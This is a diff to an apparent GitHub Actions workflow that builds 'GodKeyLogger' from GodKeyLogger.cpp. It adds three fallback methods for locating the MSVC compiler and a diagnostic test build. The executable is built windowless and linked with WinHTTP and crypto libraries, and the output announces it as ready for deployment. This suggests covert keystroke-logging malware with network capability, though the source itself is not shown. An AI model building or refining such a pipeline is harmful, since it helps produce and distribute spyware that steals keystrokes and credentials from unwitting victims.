@@ -1,9 +1,5 @@
 name: 🏗️ Build GodKeyLogger
-
-on:
-  push:
-    branches: [ main ]
-  workflow_dispatch:
+on: [push]
 
 jobs:
   build:
@@ -13,39 +9,80 @@ jobs:
     - name: 📥 Checkout code
       uses: actions/checkout@v4
       
-    - name: 🏗️ Build (Direct Method - No Setup)
+    - name: 🔍 Find Visual Studio Version
+      shell: cmd
+      run: |
+        echo Checking Visual Studio installation...
+        dir "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Tools\MSVC\"
+        echo.
+        echo Looking for cl.exe...
+        
+    - name: 🛠️ Build (Automatic Discovery)
       shell: cmd
       run: |
         echo ====================================
-        echo   BUILDING GOD KEYLOGGER v3.0
+        echo   BUILDING GOD KEYLOGGER
         echo ====================================
         
-        :: SIMPLE DIRECT BUILD - NO ENVIRONMENT SETUP
-        :: Just use the full path to cl.exe
+        :: Method 1: Use Developer Command Prompt
+        echo Method 1: Using VsDevCmd...
+        call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\Tools\VsDevCmd.bat" -arch=x64
         
-        "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Tools\MSVC\14.38.33130\bin\Hostx64\x64\cl.exe" ^
-        /nologo ^
-        /EHsc ^
-        /O2 ^
-        /std:c++17 ^
-        /DUNICODE ^
-        /D_UNICODE ^
-        /MT ^
-        GodKeyLogger.cpp ^
-        /link ^
-        /SUBSYSTEM:WINDOWS ^
-        /OUT:GodKeyLogger.exe ^
-        user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
-        
-        if %errorlevel% neq 0 (
-            echo ⚠️ First method failed, trying alternative path...
+        :: Check if cl.exe works
+        cl.exe /? >nul 2>&1
+        if %errorlevel% equ 0 (
+            echo ✅ cl.exe is working!
             
-            :: Alternative path (different version)
-            "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Tools\MSVC\14.37.32822\bin\Hostx64\x64\cl.exe" ^
-            /nologo /EHsc /O2 GodKeyLogger.cpp ^
-            /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe ^
-            user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
+            :: Build with basic options
+            cl.exe /nologo /EHsc /O2 /DUNICODE /D_UNICODE /MT ^
+              GodKeyLogger.cpp ^
+              /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe ^
+              user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
+        ) else (
+            echo ❌ cl.exe not found via VsDevCmd
+            goto method2
         )
+        
+        goto verify
+        
+        :method2
+        echo.
+        echo Method 2: Searching for cl.exe...
+        
+        :: Find cl.exe
+        where /R "C:\Program Files\Microsoft Visual Studio\" cl.exe > cl_location.txt 2>nul
+        set /p CLPATH=<cl_location.txt
+        
+        if "%CLPATH%"=="" (
+            echo ❌ cl.exe not found, trying final method...
+            goto method3
+        )
+        
+        echo Found cl.exe at: %CLPATH%
+        "%CLPATH%" /nologo /EHsc /O2 /DUNICODE /D_UNICODE /MT ^
+          GodKeyLogger.cpp ^
+          /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe ^
+          user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
+          
+        goto verify
+        
+        :method3
+        echo.
+        echo Method 3: Using PowerShell to find compiler...
+        
+        powershell -Command "`
+        `$cl = Get-ChildItem -Path 'C:\Program Files\Microsoft Visual Studio' -Recurse -Filter 'cl.exe' -ErrorAction SilentlyContinue | Select-Object -First 1; `
+        if (`$cl) { `
+            Write-Host 'Found cl.exe at: ' `$cl.FullName; `
+            & `$cl.FullName /nologo /EHsc /O2 GodKeyLogger.cpp /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe user32.lib gdi32.lib advapi32.lib winhttp.lib; `
+            if (`$LASTEXITCODE -eq 0) { Write-Host 'Build successful!' } `
+        } else { `
+            Write-Host 'ERROR: No compiler found!'; `
+            exit 1 `
+        }"
+        
+        :verify
+        echo.
         
     - name: ✅ Verify Build
       shell: cmd
@@ -56,17 +93,25 @@ jobs:
             
             for %%F in (GodKeyLogger.exe) do (
                 echo 📦 Size: %%~zF bytes
-                echo 🕐 Time: %time%
             )
             
             echo.
             echo ====================================
-            echo   READY TO DEPLOY
+            echo   READY FOR DEPLOYMENT
             echo ====================================
         ) else (
-            echo ❌ BUILD FAILED!
-            echo Checking for compiler...
-            dir "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Tools\MSVC\"
+            echo ❌ BUILD FAILED - Creating diagnostic file...
+            echo Creating diagnostic information...
+            
+            :: Create a test file to see what's wrong
+            echo #include <windows.h> > test.cpp
+            echo int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) { return 0; } >> test.cpp
+            
+            :: Try to compile a simple test
+            cl.exe /nologo /EHsc /O2 test.cpp /link /SUBSYSTEM:WINDOWS /OUT:test.exe user32.lib 2>&1
+            
+            dir *.exe
+            dir *.cpp
             exit 1
         )
         
